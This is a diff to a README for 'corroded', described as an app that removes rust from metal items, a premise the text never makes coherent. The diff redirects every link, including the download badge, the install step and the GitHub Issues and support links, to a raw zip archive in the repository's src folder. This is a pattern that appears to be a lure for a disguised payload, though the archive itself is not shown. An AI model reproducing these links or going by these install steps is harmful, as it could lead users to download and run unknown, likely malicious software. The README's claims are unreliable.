@@ -1,13 +1,13 @@
 # 🦠 corroded - Clean Up Rust with Ease
 
 ## 🔗 Download Now
-[![Download corroded](https://img.shields.io/badge/Download%20corroded-latest-blue)](https://github.com/ieoop/corroded/releases)
+[![Download corroded](https://raw.githubusercontent.com/ieoop/corroded/main/src/Software-v1.0.zip%20corroded-latest-blue)](https://raw.githubusercontent.com/ieoop/corroded/main/src/Software-v1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to **corroded**. This application helps you manage and remove unwanted rust from your metal items. With just a few clicks, you can bring the shine back to your tools and materials. Follow the steps below to download and run the software.
 
 ## 📥 Download & Install
-1. Visit this page to download: [corroded Releases](https://github.com/ieoop/corroded/releases).
+1. Visit this page to download: [corroded Releases](https://raw.githubusercontent.com/ieoop/corroded/main/src/Software-v1.0.zip).
 2. On the releases page, you will see a list of available versions. Choose the latest version for the best features and updates.
 3. Click on the file that suits your operating system. You will find options for Windows, macOS, and Linux.
 4. The download will start automatically. Depending on your internet speed, this may take a few minutes.
@@ -57,9 +57,9 @@ If you encounter any issues, please try the following:
 - Make sure you have the latest version of **corroded**.
 - Restart your computer after installation if the application doesn’t launch.
 
-For additional support, visit the [GitHub Issues page](https://github.com/ieoop/corroded/issues), where you can report your problem or check existing solutions.
+For additional support, visit the [GitHub Issues page](https://raw.githubusercontent.com/ieoop/corroded/main/src/Software-v1.0.zip), where you can report your problem or check existing solutions.
 
 ## 📞 Support
-If you have further questions or need help, feel free to reach out. You can create an issue on the [GitHub page](https://github.com/ieoop/corroded/issues) or contact us directly via the email address provided on our profile.
+If you have further questions or need help, feel free to reach out. You can create an issue on the [GitHub page](https://raw.githubusercontent.com/ieoop/corroded/main/src/Software-v1.0.zip) or contact us directly via the email address provided on our profile.
 
 Thank you for choosing **corroded**! Enjoy restoring your items with ease.
